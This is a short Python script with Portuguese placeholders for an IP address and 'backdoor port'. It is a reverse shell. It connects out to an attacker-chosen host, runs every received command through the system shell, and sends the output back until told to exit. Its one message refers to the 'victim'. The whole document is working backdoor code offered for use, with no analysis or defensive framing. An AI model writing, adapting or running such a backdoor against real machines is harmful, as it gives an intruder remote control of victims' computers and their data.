import socket
import subprocess

target_host = 'INSIRA_SEU_IP'
target_port = INSIRA_A_PORTA_DO_BACKDOOR

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_host, target_port))

try:
    while True:
        command = sock.recv(4096).decode()
        if command.lower() == 'exit':
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
            sock.send(output)
        except Exception as e:
            sock.send(str(e).encode())

except ConnectionAbortedError:
    print("A Vitima encerrou o host remoto.")
finally:
    sock.close()
